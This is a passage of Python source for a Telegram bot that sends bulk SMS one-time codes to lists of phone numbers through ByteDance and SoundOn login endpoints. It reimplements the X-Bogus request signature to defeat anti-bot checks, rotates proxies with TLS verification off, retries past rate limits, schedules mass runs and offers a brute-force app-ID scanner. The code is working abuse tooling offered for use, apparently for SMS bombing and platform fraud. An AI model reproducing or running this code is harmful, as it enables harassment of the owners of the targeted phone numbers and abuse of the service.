            response = requests.post(url, data=body, headers=headers, proxies=proxies, verify=False, timeout=15)
            elapsed = (time.time() - start_time) * 1000
            
            self.last_request_time = time.time()
            
            try:
                result = response.json()
                success = result.get("message") == "success"
                error_code = result.get("data", {}).get("error_code")
                
                if not success and error_code == 7 and retry_with_delay:
                    time.sleep(10)
                    return self.send_otp_sync(phone_number, proxy, retry_with_delay=False)
                
                return {
                    "success": success,
                    "message": result.get("message", ""),
                    "data": result,
                    "time_ms": elapsed,
                    "phone": phone,
                    "status_code": response.status_code,
                    "proxy_used": proxy or "Direct",
                    "device_id": self.DEVICE_ID,
                }
            except json.JSONDecodeError:
                return {"success": False, "error": "Invalid JSON response", "raw": response.text[:200], "time_ms": elapsed, "phone": phone, "status_code": response.status_code}
        except requests.exceptions.RequestException as e:
            elapsed = (time.time() - start_time) * 1000
            return {"success": False, "error": str(e), "time_ms": elapsed, "phone": phone}


# ============================================
# SoundOn (Mobile /sep) - Pure-Python X-Bogus OTP Sender
# Endpoint: https://www.soundon.global/passport/web/send_code/
# ============================================

SOUNDON_CUSTOM_B64 = "Dkdpgh4ZKsQB80/Mfvw36XI1R25-WUAlEi7NLboqYTOPuzmFjJnryx9HVGcaStCe="
SOUNDON_STD_B64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
SOUNDON_UA_KEY = bytes([0x00, 0x01, 0x0E])
SOUNDON_PL_KEY = bytes([0xFF])
SOUNDON_MAGIC = 0x4A41279F
SOUNDON_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
)


def _soundon_rc4(key: bytes, data: bytes) -> bytes:
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    out = bytearray()
    i = j = 0
    for b in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(b ^ S[(S[i] + S[j]) % 256])
    return bytes(out)


def _soundon_md5_hex(data) -> str:
    if isinstance(data, str):
        data = data.encode()
    return hashlib.md5(data).hexdigest()


def _soundon_double_md5(data) -> bytes:
    return bytes.fromhex(_soundon_md5_hex(bytes.fromhex(_soundon_md5_hex(data))))


def _soundon_ua_md5(ua: str) -> bytes:
    enc = _soundon_rc4(SOUNDON_UA_KEY, ua.encode())
    b64 = base64.b64encode(enc).decode("iso-8859-1")
    return bytes.fromhex(_soundon_md5_hex(b64))


def soundon_xbogus(query: str, body: str = "") -> str:
    ts = int(time.time())
    p = _soundon_double_md5(query)
    b = _soundon_double_md5(body or "")
    u = _soundon_ua_md5(SOUNDON_UA)
    pl = (
        bytearray([0x40])
        + bytearray(SOUNDON_UA_KEY)
        + bytearray(p[14:16])
        + bytearray(b[14:16])
        + bytearray(u[14:16])
        + bytearray(struct.pack(">I", ts))
        + bytearray(struct.pack(">I", SOUNDON_MAGIC))
    )
    xor_val = 0
    for byte in pl:
        xor_val ^= byte
    pl.append(xor_val & 0xFF)
    enc = _soundon_rc4(SOUNDON_PL_KEY, bytes(pl))
    final = bytes([0x02, 0xFF]) + enc
    std = base64.b64encode(final).decode("ascii")
    return std.translate(str.maketrans(SOUNDON_STD_B64, SOUNDON_CUSTOM_B64))


def _soundon_encode_phone(phone: str) -> str:
    return "".join(f"{ord(c) ^ 5:02x}" for c in phone)


class SoundOnOTPSender:
    """Pure-Python X-Bogus signed SoundOn (TikTok-PK) SMS sender.

    Used by the /sep (Mobile) bot command. Each instance maintains its own
    requests.Session so it is safe to run in a thread pool worker.
    """

    REGION_URL = "https://www.soundon.global/passport/web/region/"
    SEND_URL = "https://www.soundon.global/passport/web/send_code/"
    REFERER = "https://www.soundon.global/login/login?lang=en&region=PK"

    def __init__(self, domain: Optional[str] = None,
                 type_code: Optional[int] = None,
                 aid: Optional[str] = None):
        self.session = requests.Session()
        self.session.headers["user-agent"] = SOUNDON_UA
        self.csrf = ""
        self.ms_token = ""
        self.custom_domain = domain
        self.custom_tc = type_code or 3635
        self.custom_aid = aid or "2960"
        if domain:
            self.REGION_URL = f"https://{domain}/passport/web/region/"
            self.SEND_URL = f"https://{domain}/passport/web/send_code/"
            self.REFERER = f"https://{domain}/login/login?lang=en&region=PK"

    def _apply_proxy(self, proxy: Optional[str]):
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}
            self.session.verify = False
        else:
            self.session.proxies = {}
            self.session.verify = True

    def _refresh_tokens(self, proxy: Optional[str] = None):
        self._apply_proxy(proxy)
        params = {
            "aid": self.custom_aid,
            "account_sdk_source": "web",
            "sdk_version": "2.1.10-tiktok",
            "language": "en",
        }
        body = "hashed_id=init&type=1"
        qs = urlencode(params)
        params["X-Bogus"] = soundon_xbogus(qs, body)
        self.session.post(
            self.REGION_URL,
            params=params,
            data=body,
            headers={
                "content-type": "application/x-www-form-urlencoded",
                "referer": self.REFERER,
            },
            timeout=30,
        )
        self.csrf = self.session.cookies.get("passport_csrf_token", "") or self.csrf
        self.ms_token = self.session.cookies.get("msToken", "") or self.ms_token

    def send_otp_sync(self, phone: str, proxy: Optional[str] = None) -> Dict:
        start_time = time.time()
        try:
            if not self.csrf:
                self._refresh_tokens(proxy)
            self._apply_proxy(proxy)
            encoded = _soundon_encode_phone(phone)
            body = (
                f"mix_mode=1&mobile={encoded}&type={self.custom_tc}&language=en&fixed_mix_mode=1"
            )
            params = {
                "aid": self.custom_aid,
                "account_sdk_source": "web",
                "sdk_version": "2.1.10-tiktok",
                "language": "en",
                "verifyFp": f"verify_{int(time.time())}_{os.urandom(4).hex()}",
            }
            if self.ms_token:
                params["msToken"] = self.ms_token
            qs = urlencode(params)
            params["X-Bogus"] = soundon_xbogus(qs, body)
            r = self.session.post(
                self.SEND_URL,
                params=params,
                data=body,
                headers={
                    "content-type": "application/x-www-form-urlencoded",
                    "referer": self.REFERER,
                    "x-tt-passport-csrf-token": self.csrf,
                    "accept": "application/json, text/javascript",
                },
                timeout=30,
            )
            new_csrf = self.session.cookies.get("passport_csrf_token", "")
            if new_csrf:
                self.csrf = new_csrf
            new_ms = self.session.cookies.get("msToken", "")
            if new_ms:
                self.ms_token = new_ms
            elapsed = (time.time() - start_time) * 1000
            try:
                data = r.json()
            except ValueError:
                return {
                    "success": False,
                    "error": "Invalid JSON response",
                    "raw": r.text[:200],
                    "time_ms": elapsed,
                    "phone": phone,
                    "status_code": r.status_code,
                    "proxy_used": proxy or "Direct",
                }
            success = data.get("message") == "success"
            inner = data.get("data") if isinstance(data.get("data"), dict) else {}
            return {
                "success": success,
                "data": inner,
                "message": data.get("message"),
                "raw": data,
                "time_ms": elapsed,
                "phone": phone,
                "status_code": r.status_code,
                "proxy_used": proxy or "Direct",
            }
        except requests.exceptions.RequestException as e:
            elapsed = (time.time() - start_time) * 1000
            return {
                "success": False,
                "error": str(e),
                "time_ms": elapsed,
                "phone": phone,
                "proxy_used": proxy or "Direct",
            }
        except Exception as e:
            elapsed = (time.time() - start_time) * 1000
            return {
                "success": False,
                "error": f"{type(e).__name__}: {e}",
                "time_ms": elapsed,
                "phone": phone,
                "proxy_used": proxy or "Direct",
            }


# ============================================
# TASK MANAGEMENT
# ============================================

@dataclass
class Task:
    task_id: str
    phone_numbers: List[str]
    proxies: List[str]
    status: str = "pending"
    current_index: int = 0
    success_count: int = 0
    fail_count: int = 0
    cancelled: bool = False
    chat_id: str = ""
    app_key: str = "pipix"
    results: List[Dict] = field(default_factory=list)
    start_time: float = field(default_factory=time.time)
    delay: float = 0.0


@dataclass
class ScheduledTask:
    schedule_id: str
    phone_numbers: List[str]
    proxies: List[str]
    chat_id: str
    scheduled_time: datetime
    status: str = "pending"  # pending, running, completed, cancelled
    app_key: str = "pipix"
    override_domain: Optional[str] = None
    override_tc: Optional[int] = None
    override_aid: Optional[int] = None
    domain_mode: str = "single"
    sep_domain: Optional[str] = None
    sep_tc: Optional[int] = None
    sep_aid: Optional[str] = None


class TaskManager:
    def __init__(self):
        self.tasks: Dict[str, Task] = {}
        self.scheduled_tasks: Dict[str, ScheduledTask] = {}
        self.running_tasks: Set[str] = set()
        self.task_counter = 0
        self.schedule_counter = 0
        self._lock = asyncio.Lock()
    
    async def create_task(self, phone_numbers: List[str], proxies: List[str], chat_id: str) -> str:
        async with self._lock:
            self.task_counter += 1
            task_id = f"task_{self.task_counter}"
            task = Task(task_id=task_id, phone_numbers=phone_numbers, proxies=proxies, chat_id=chat_id)
            self.tasks[task_id] = task
            return task_id
    
    async def create_scheduled_task(self, phone_numbers: List[str], proxies: List[str], chat_id: str, scheduled_time: datetime,
                                     app_key: str = "pipix", override_domain: Optional[str] = None,
                                     override_tc: Optional[int] = None, override_aid: Optional[int] = None,
                                     domain_mode: str = "single") -> str:
        async with self._lock:
            self.schedule_counter += 1
            schedule_id = f"schedule_{self.schedule_counter}"
            scheduled_task = ScheduledTask(
                schedule_id=schedule_id,
                phone_numbers=phone_numbers,
                proxies=proxies,
                chat_id=chat_id,
                scheduled_time=scheduled_time,
                app_key=app_key,
                override_domain=override_domain,
                override_tc=override_tc,
                override_aid=override_aid,
                domain_mode=domain_mode,
            )
            self.scheduled_tasks[schedule_id] = scheduled_task
            return schedule_id
    
    def get_task(self, task_id: str) -> Optional[Task]:
        return self.tasks.get(task_id)
    
    def get_scheduled_task(self, schedule_id: str) -> Optional[ScheduledTask]:
        return self.scheduled_tasks.get(schedule_id)
    
    async def cancel_task(self, task_id: str) -> bool:
        task = self.tasks.get(task_id)
        if task:
            task.cancelled = True
            task.status = "cancelled"
            return True
        return False
    
    async def cancel_scheduled_task(self, schedule_id: str) -> bool:
        scheduled_task = self.scheduled_tasks.get(schedule_id)
        if scheduled_task:
            scheduled_task.status = "cancelled"
            return True
        return False
    
    def get_running_count(self) -> int:
        return len(self.running_tasks)
    
    def get_all_tasks(self) -> List[Task]:
        return list(self.tasks.values())
    
    def get_all_scheduled_tasks(self) -> List[ScheduledTask]:
        return list(self.scheduled_tasks.values())


# ============================================
# GLOBAL INSTANCES
# ============================================

identity_generator = DeviceIdentityGenerator()
task_manager = TaskManager()
user_states: Dict[int, Dict] = defaultdict(dict)


# ============================================
# UTILITY FUNCTIONS
# ============================================

def get_pakistan_time() -> datetime:
    return datetime.now(PAKISTAN_TZ)


def parse_phone_numbers(text: str) -> List[str]:
    """Extract phone numbers from text"""
    numbers = re.findall(r'[\+]?[\d\s\-\(\)]{10,20}', text)
    valid = []
    for num in numbers:
        clean = re.sub(r'[\s\-\(\)]', '', num)
        if len(clean) >= 10 and clean.replace('+', '').isdigit():
            valid.append(clean)
    return list(set(valid))


def parse_proxies(text: str) -> List[str]:
    """Parse proxies from text"""
    lines = text.strip().split('\n')
    proxies = []
    for line in lines:
        line = line.strip()
        if line and ':' in line:
            proxies.append(line)
    return proxies


def parse_schedule_time(time_str: str) -> Optional[datetime]:
    """Parse schedule time string to datetime"""
    try:
        # Format: HH:MM or HH:MM:SS
        now = get_pakistan_time()
        parts = time_str.strip().split(':')
        if len(parts) >= 2:
            hour = int(parts[0])
            minute = int(parts[1])
            second = int(parts[2]) if len(parts) > 2 else 0
            scheduled = now.replace(hour=hour, minute=minute, second=second, microsecond=0)
            # If time has passed today, schedule for tomorrow
            if scheduled <= now:
                scheduled += timedelta(days=1)
            return scheduled
    except:
        pass
    return None


async def send_message_safe(context: ContextTypes.DEFAULT_TYPE, chat_id: str, text: str, **kwargs):
    """Send message safely, handling long messages"""
    try:
        if len(text) > MAX_MESSAGE_LENGTH:
            chunks = [text[i:i+MAX_MESSAGE_LENGTH] for i in range(0, len(text), MAX_MESSAGE_LENGTH)]
            for chunk in chunks[:3]:
                await context.bot.send_message(chat_id=chat_id, text=chunk, **kwargs)
        else:
            await context.bot.send_message(chat_id=chat_id, text=text, **kwargs)
    except Exception as e:
        logger.error(f"Failed to send message: {e}")


# ============================================
# ASYNC OTP WRAPPER
# ============================================

async def send_otp_async(phone: str, proxies: List[str], semaphore: asyncio.Semaphore,
                         delay: float = 0.0,
                         app_key: str = DEFAULT_APP,
                         override_domain: Optional[str] = None,
                         override_tc: Optional[int] = None,
                         override_aid: Optional[int] = None) -> Dict:
    """Send OTP asynchronously using thread pool"""
    async with semaphore:
        loop = asyncio.get_event_loop()
        proxy = random.choice(proxies) if proxies else None
        
        # Create a new sender instance for thread safety
        sender = ByteDanceOTPSender(identity_generator, app_key)
        
        # Run blocking OTP send in thread pool
        result = await loop.run_in_executor(
            thread_pool, sender.send_otp_sync, phone, proxy, override_domain, override_tc, override_aid)
        
        # Retry on failure
        if not result.get("success"):
            error_desc = str(result.get("data", {}).get("description", result.get("error", ""))).lower()
            limit_keywords = ["limit", "frequency", "maximum", "too many", "often", "error", "timeout"]
            
            if any(kw in error_desc for kw in limit_keywords):
                proxy = random.choice(proxies) if proxies else None
                sender2 = ByteDanceOTPSender(identity_generator, app_key)
                result = await loop.run_in_executor(
                    thread_pool, sender2.send_otp_sync, phone, proxy, override_domain, override_tc, override_aid)
        
        await global_stats.increment(result.get("success", False))
        result["app"] = app_key
        if delay > 0:
            await asyncio.sleep(delay)
        return result


async def send_super_otp_async(phone: str, proxies: List[str], semaphore: asyncio.Semaphore, delay: float = 0.0) -> Dict:
    """Send Super/Pipixia OTP asynchronously using thread pool"""
    async with semaphore:
        loop = asyncio.get_event_loop()
        proxy = random.choice(proxies) if proxies else None
        
        # Create a new sender instance for thread safety
        sender = SuperOTPSender(identity_generator)
        
        # Run blocking OTP send in thread pool
        result = await loop.run_in_executor(thread_pool, sender.send_otp_sync, phone, proxy)
        
        # Retry on failure
        if not result.get("success"):
            error_code = result.get("data", {}).get("error_code")
            if error_code == 7:  # Rate limit
                proxy = random.choice(proxies) if proxies else None
                sender2 = SuperOTPSender(identity_generator)
                result = await loop.run_in_executor(thread_pool, sender2.send_otp_sync, phone, proxy)
        
        await global_stats.increment(result.get("success", False))
        if delay > 0:
            await asyncio.sleep(delay)
        return result


async def send_soundon_otp_async(phone: str, proxies: List[str], semaphore: asyncio.Semaphore,
                                 sep_domain: Optional[str] = None,
                                 sep_tc: Optional[int] = None,
                                 sep_aid: Optional[str] = None,
                                 delay: float = 0.0) -> Dict:
    """Send SoundOn (Mobile /sep) OTP asynchronously using thread pool."""
    async with semaphore:
        loop = asyncio.get_event_loop()
        proxy = random.choice(proxies) if proxies else None

        sender = SoundOnOTPSender(domain=sep_domain, type_code=sep_tc, aid=sep_aid)
        result = await loop.run_in_executor(thread_pool, sender.send_otp_sync, phone, proxy)

        # One retry on hard failure with a fresh proxy
        if not result.get("success") and proxies:
            retry_proxy = random.choice(proxies)
            sender2 = SoundOnOTPSender(domain=sep_domain, type_code=sep_tc, aid=sep_aid)
            result = await loop.run_in_executor(thread_pool, sender2.send_otp_sync, phone, retry_proxy)

        await global_stats.increment(result.get("success", False))
        if delay > 0:
            await asyncio.sleep(delay)
        return result


# ============================================
# COMMAND HANDLERS
# ============================================

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    pk_time = get_pakistan_time().strftime("%I:%M %p PKT")
    
    keyboard = [
        [InlineKeyboardButton("📦 Bulk OTP", callback_data="bulk"), InlineKeyboardButton("📱 Single OTP", callback_data="single")],
        [InlineKeyboardButton("📁 Upload Numbers", callback_data="upload_numbers"), InlineKeyboardButton("🔒 Upload Proxies", callback_data="upload_proxies")],
        [InlineKeyboardButton("⏰ Schedule Task", callback_data="schedule"), InlineKeyboardButton("📋 Scheduled", callback_data="scheduled_list")],
        [InlineKeyboardButton("📊 Status", callback_data="status"), InlineKeyboardButton("🔄 Tasks", callback_data="tasks")],
        [InlineKeyboardButton("📈 Global Stats", callback_data="global_stats")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    msg = f"""
🚀 <b>ByteDance Multi-App OTP Bot v13.0</b>

⚡ <b>Performance:</b>
• 5-10 Concurrent OTP/Second
• 100+ Concurrent Tasks
• Zero Blocking - Instant Response
• Multi-User Support (1000+ Users)

🕐 <b>Time:</b> {pk_time}

<b>📱 Single OTP:</b>
<code>/single +923099003842</code>

<b>📦 Bulk OTP:</b>
/bulk - Start bulk task

<b>📲 Mobile (SoundOn):</b>
/sep - Bulk SoundOn SMS on saved numbers
<code>/sep +9230xxxxxxxx</code> - Single SoundOn test
<code>/schedulesep 14:30</code> - Schedule /sep at 2:30 PM

<b>⏰ Schedule Task:</b>
<code>/schedule 14:30</code> - Schedule at 2:30 PM

<b>📁 File Upload:</b>
/unum — Upload TXT/CSV files
/uprox — Upload proxy files

<b>🔧 Commands:</b>
/apps - Available ByteDance apps (all)
/setapp <name> - Switch app (all apps)
/apps2 - CONFIRMED SUCCESS apps only
/setapp2 <name> - Switch to confirmed app
/status - Bot status
/tasks - Active tasks
/scheduled - Scheduled tasks
/cancel [id] - Cancel task
/stats - Global statistics
"""
    await update.message.reply_text(msg, parse_mode="HTML", reply_markup=reply_markup)


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comprehensive list of ALL bot commands with usage."""
    msg = """<b>📋 COMPLETE COMMAND LIST</b>

<b>━━━ OTP Sending ━━━</b>
/single +number — Send single OTP
/bulk — Bulk OTP to saved numbers
/sep — Mobile (SoundOn) bulk SMS
/sep +number — Single SoundOn test
/zijie — Super/Pipixia bulk OTP
/zsingle +number — Single Super OTP

<b>━━━ Scheduling ━━━</b>
/sched HH:MM — Schedule /bulk (PKT)
/schsep HH:MM — Schedule /sep (PKT)
/scheduled — List pending schedules
/csched ID — Cancel a schedule

<b>━━━ Numbers & Proxies ━━━</b>
/snum — Paste numbers (then /done)
/unum — Upload number files (then /done)
/sprox — Paste proxies (then /done)
/uprox — Upload proxy files (then /done)
/cnum — Clear saved numbers
/cprox — Clear saved proxies
/done — Save buffered data

<b>━━━ App Config ━━━</b>
/apps — All ByteDance apps
/setapp name — Configure app
/apps2 — Confirmed apps only
/setapp2 name — Configure confirmed app
/setsep — Configure /sep domain/tc/aid
/delay N — Set delay between requests (0=max)

<b>━━━ Monitoring ━━━</b>
/status — Bot status + your data
/tasks — Active running tasks
/cancel ID — Cancel a task
/stats — Global hit statistics

<b>━━━ Advanced ━━━</b>
/test — AID brute force scanner (1-100k)
/test web — 100k scan on web endpoint
/test mobile — 100k scan on signed mobile
/test vip — Known AIDs x all TCs combo

<b>━━━ General ━━━</b>
/start — Main menu with buttons
/help — This command list

<b>💡 Tip:</b> Long names also work:
/setnumbers /uploadnumbers /setproxies
/uploadproxies /clearnumbers /clearproxies
/schedule /schedulesep /cancelschedule
/zijiesingle /setdelay
"""
    await update.message.reply_text(msg, parse_mode="HTML")
async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats = identity_generator.get_stats()
    running = task_manager.get_running_count()
    pk_time = get_pakistan_time().strftime("%Y-%m-%d %I:%M:%S %p")
    user_id = update.effective_user.id
    numbers_count = len(user_states[user_id].get('numbers', []))
    proxies_count = len(user_states[user_id].get('proxies', []))
    g_stats = global_stats.get_stats()
    scheduled_count = len([s for s in task_manager.get_all_scheduled_tasks() if s.status == "pending"])
    
    msg = f"""
📊 <b>Bot Status</b>

🤖 <b>Bot:</b> Online ✅
📦 <b>SignerPy:</b> {'✅ Available' if SIGNERPY_AVAILABLE else '❌ Missing'}
🕐 <b>Pakistan Time:</b> {pk_time}

⚡ <b>Performance:</b>
• Max Concurrent OTP: {MAX_CONCURRENT_OTP}
• Max Concurrent Tasks: {MAX_CONCURRENT_TASKS}
• Batch Size: {BATCH_SIZE}

🔢 <b>Your Data:</b>
• Numbers: {numbers_count:,}
• Proxies: {proxies_count:,}

📋 <b>Tasks:</b>
• Running: {running}
• Scheduled: {scheduled_count}
• Generated IDs: {stats['total_generated']:,}

📈 <b>Global Stats:</b>
• Total Requests: {g_stats['total_requests']:,}
• Success: {g_stats['total_success']:,}
• Failed: {g_stats['total_failed']:,}
"""
    await update.message.reply_text(msg, parse_mode="HTML")


async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show global statistics"""
    g_stats = global_stats.get_stats()
    uptime_mins = g_stats['uptime_seconds'] / 60
    success_rate = (g_stats['total_success'] / g_stats['total_requests'] * 100) if g_stats['total_requests'] > 0 else 0
    
    msg = f"""
📈 <b>Global Statistics</b>

🔢 <b>Total Requests:</b> {g_stats['total_requests']:,}
✅ <b>Success:</b> {g_stats['total_success']:,}
❌ <b>Failed:</b> {g_stats['total_failed']:,}
📊 <b>Success Rate:</b> {success_rate:.1f}%

⏱ <b>Uptime:</b> {uptime_mins:.1f} minutes
🚀 <b>Requests/Minute:</b> {g_stats['requests_per_minute']:.1f}
"""
    await update.message.reply_text(msg, parse_mode="HTML")



async def apps_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show available ByteDance apps"""
    user_id = update.effective_user.id
    current = user_states[user_id].get('app', DEFAULT_APP)
    lines_list = []
    for key, app in BYTEDANCE_APPS.items():
        marker = ' (current)' if key == current else ''
        method = "🌐 web" if app.get("web_endpoint") else "📱 unsigned" if app.get("unsigned_mobile") else "📞 voice" if app.get("voice_endpoint") else "🔐 signed"
        lines_list.append(f'<code>{key}</code> - {app["name"]} (AID={app["aid"]}) [{method}]{marker}')
    msg = "<b>Available ByteDance Apps:</b>\n\n" + "\n".join(lines_list) + "\n\n<b>Switch:</b> <code>/setapp douyin</code>"
    await update.message.reply_text(msg, parse_mode='HTML')


async def setapp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Switch active ByteDance app — shows inline buttons if no args"""
    user_id = update.effective_user.id
    if context.args:
        app_key = context.args[0].lower()
        if app_key not in BYTEDANCE_APPS:
            available = ', '.join(BYTEDANCE_APPS.keys())
            await update.message.reply_text(f'Unknown app: <code>{app_key}</code>\nAvailable: {available}', parse_mode='HTML')
            return
        # Show domain selection for this app
        await _show_domain_buttons(update.message, user_id, app_key, "setapp")
        return
    # No args — show app buttons
    keyboard = []
    row = []
    for key, app in BYTEDANCE_APPS.items():
        method = "🌐" if app.get("web_endpoint") else "📱" if app.get("unsigned_mobile") else "📞" if app.get("voice_endpoint") else "🔐"
        btn_text = f"{method} {key} ({app['aid']})"
        row.append(InlineKeyboardButton(btn_text, callback_data=f"sa|{key}"))
        if len(row) == 2:
            keyboard.append(row)
            row = []
    if row:
        keyboard.append(row)
    await update.message.reply_text("<b>Select App:</b>", parse_mode='HTML',
                                    reply_markup=InlineKeyboardMarkup(keyboard))


async def apps2_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show CONFIRMED SUCCESS apps only (exact tested combinations)"""
    user_id = update.effective_user.id
    current = user_states[user_id].get('app', DEFAULT_APP)
    lines_list = []
    for key, app in CONFIRMED_APPS.items():
        marker = ' (current)' if key == current else ''
        method = "🌐 web" if app.get("web_endpoint") else "📱 unsigned" if app.get("unsigned_mobile") else "📞 voice" if app.get("voice_endpoint") else "🔐 signed"
        lines_list.append(f'<code>{key}</code> - {app["name"]} (AID={app["aid"]}) [{method}]{marker}')
    msg = "<b>CONFIRMED SUCCESS Apps Only:</b>\n\n" + "\n".join(lines_list) + "\n\n<b>Switch:</b> <code>/setapp2 tiktok_ads</code>\n<b>Best regions:</b> AU, DE, SG"
    await update.message.reply_text(msg, parse_mode='HTML')


async def setapp2_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Switch to a CONFIRMED SUCCESS app — shows inline buttons if no args"""
    user_id = update.effective_user.id
    if context.args:
        app_key = context.args[0].lower()
        if app_key in CONFIRMED_APPS:
            await _show_domain_buttons(update.message, user_id, app_key, "setapp2")
        else:
            available = ', '.join(CONFIRMED_APPS.keys())
            await update.message.reply_text(f'Unknown confirmed app: <code>{app_key}</code>\nAvailable: {available}', parse_mode='HTML')
        return
    # No args — show confirmed app buttons
    keyboard = []
    row = []
    for key, app in CONFIRMED_APPS.items():
        method = "🌐" if app.get("web_endpoint") else "📱" if app.get("unsigned_mobile") else "📞" if app.get("voice_endpoint") else "🔐"
        btn_text = f"{method} {key} ({app['aid']})"
        row.append(InlineKeyboardButton(btn_text, callback_data=f"sa2|{key}"))
        if len(row) == 2:
            keyboard.append(row)
            row = []
    if row:
        keyboard.append(row)
    await update.message.reply_text("<b>Select Confirmed App:</b>", parse_mode='HTML',
                                    reply_markup=InlineKeyboardMarkup(keyboard))


async def _send_or_edit(target, text, reply_markup=None):
    """Send a new message or edit an existing one depending on the target type."""
    if hasattr(target, 'edit_message_text'):
        await target.edit_message_text(text, parse_mode='HTML', reply_markup=reply_markup)
    else:
        await target.reply_text(text, parse_mode='HTML', reply_markup=reply_markup)


async def _show_domain_buttons(msg_or_query, user_id, app_key, source):
    """Show domain selection inline buttons for an app"""
    app = CONFIRMED_APPS.get(app_key) or BYTEDANCE_APPS.get(app_key)
    if not app:
        return
    user_states[user_id]['_pending_app'] = app_key
    user_states[user_id]['_pending_source'] = source
    domains = app.get("domains", [])
    keyboard = []
    for i, domain in enumerate(domains):
        short = domain[:35] + "..." if len(domain) > 38 else domain
        keyboard.append([InlineKeyboardButton(f"🌐 {short}", callback_data=f"dom|{i}")])
    keyboard.append([InlineKeyboardButton("✅ Choose All Domains (round-robin)", callback_data="dom|all")])
    keyboard.append([InlineKeyboardButton("📝 Custom Domain", callback_data="dom|custom")])
    text = f"<b>{app['name']} (AID={app['aid']})</b>\n\nSelect domain:"
    await _send_or_edit(msg_or_query, text, InlineKeyboardMarkup(keyboard))


async def _show_tc_buttons(target, user_id):
    """Show type code selection inline buttons"""
    app_key = user_states[user_id].get('_pending_app')
    app = CONFIRMED_APPS.get(app_key) or BYTEDANCE_APPS.get(app_key)
    if not app:
        return
    codes = app.get("type_codes", [3635])
    keyboard = []
    row = []
    for tc in codes:
        row.append(InlineKeyboardButton(str(tc), callback_data=f"tc|{tc}"))
        if len(row) == 3:
            keyboard.append(row)
            row = []
    if row:
        keyboard.append(row)
    keyboard.append([InlineKeyboardButton("📝 Custom Type Code", callback_data="tc|custom")])
    domain_info = user_states[user_id].get('_pending_domain_display', 'All Domains')
    text = f"<b>{app['name']} (AID={app['aid']})</b>\nDomain: {domain_info}\n\nSelect type code:"
    await _send_or_edit(target, text, InlineKeyboardMarkup(keyboard))


async def _show_aid_prompt(target, user_id):
    """Ask user whether to use a custom AID (Y/N)."""
    app_key = user_states[user_id].get('_pending_app')
    app = CONFIRMED_APPS.get(app_key) or BYTEDANCE_APPS.get(app_key)
    if not app:
        return
    keyboard = [[
        InlineKeyboardButton("✅ Y (custom)", callback_data="aid|y"),
        InlineKeyboardButton("❌ N (default)", callback_data="aid|n"),
    ]]
    domain_info = user_states[user_id].get('_pending_domain_display', 'All Domains')
    tc_pending = user_states[user_id].get('_pending_selected_tc', '?')
    tc_custom = user_states[user_id].get('_pending_tc_custom', False)
    tc_display = f"{tc_pending} (custom)" if tc_custom else str(tc_pending)
    text = (
        f"<b>{app['name']}</b>\n"
        f"Domain: {domain_info}\n"
        f"Type Code: {tc_display}\n"
        f"Default AID: <code>{app['aid']}</code>\n\n"
        f"❔ Custom AID? (Y/N)"
    )
    await _send_or_edit(target, text, InlineKeyboardMarkup(keyboard))


async def _commit_app_selection(target, user_id):
    """Commit pending app/domain/tc/aid selections to user_states and confirm."""
    app_key = user_states[user_id].get('_pending_app')
    app = CONFIRMED_APPS.get(app_key) or BYTEDANCE_APPS.get(app_key)
    if not app:
        await _send_or_edit(target, "❌ Error: app not found")
        return
    user_states[user_id]['app'] = app_key
    user_states[user_id]['selected_tc'] = user_states[user_id].get('_pending_selected_tc')
    user_states[user_id]['selected_domain'] = user_states[user_id].get('_pending_selected_domain')
    user_states[user_id]['domain_mode'] = user_states[user_id].get('_pending_domain_mode', 'all')
    user_states[user_id]['selected_aid'] = user_states[user_id].get('_pending_selected_aid')

    tc = user_states[user_id]['selected_tc']
    tc_custom = user_states[user_id].get('_pending_tc_custom', False)
    tc_display = f"{tc} (custom)" if tc_custom else str(tc)
    domain_display = user_states[user_id].get('_pending_domain_display', 'Random')
    domain_mode = user_states[user_id]['domain_mode']
    custom_aid = user_states[user_id]['selected_aid']
    aid_display = f"{custom_aid} (custom)" if custom_aid else f"{app['aid']} (default)"
    method = "🌐 Web" if app.get("web_endpoint") else "📱 Unsigned" if app.get("unsigned_mobile") else "📞 Voice" if app.get("voice_endpoint") else "🔐 Signed"
    confirmed = " (CONFIRMED)" if app_key in CONFIRMED_APPS else ""
    text = (
        f"✅ <b>App configured{confirmed}:</b>\n\n"
        f"📱 App: {app['name']}\n"
        f"🆔 AID: {aid_display}\n"
        f"🌐 Domain: {domain_display}\n"
        f"🔢 Type Code: {tc_display}\n"
        f"⚙️ Method: {method}\n"
        f"🔄 Mode: {'Round-robin all domains' if domain_mode == 'all' else 'Single domain'}\n\n"
        f"<b>Ready!</b> Use /single +number or /bulk"
    )
    await _send_or_edit(target, text)


async def single_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if context.args:
        phone = ' '.join(context.args)
        await process_single_otp(update, context, phone)
    else:
        user_states[user_id]['awaiting'] = 'single_phone'
        await update.message.reply_text(
            "📱 <b>Single OTP</b>\n\n"
            "Usage: <code>/single +923099003842</code>\n"
            "Or: <code>/single +923099003842 proxy:port</code>",
            parse_mode="HTML"
        )


async def bulk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    numbers = user_states[user_id].get('numbers', [])
    
    if not numbers:
        await update.message.reply_text(
            "❌ <b>No numbers loaded!</b>\n\n"
            "Use /setnumbers or /uploadnumbers first.",
            parse_mode="HTML"
        )
        return
    
    proxies = user_states[user_id].get('proxies', [])
    await start_bulk_task(update, context, numbers, proxies)


